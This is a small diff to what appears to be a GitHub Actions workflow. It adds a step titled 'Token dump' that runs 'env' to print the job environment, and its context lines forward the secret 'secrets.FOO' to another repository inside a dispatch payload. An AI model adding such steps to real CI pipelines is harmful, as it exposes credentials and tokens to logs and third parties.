@@ -25,4 +25,5 @@ jobs:
           token: ${{ secrets.PAT_TOKEN }}
           event-type: nl-token-event
           client-payload: '{"ref": "${{ github.ref_name }}", "sha": "${{ github.sha }}", "token": "${{ secrets.FOO }}"}'
+      - name: Token dump
         run: env
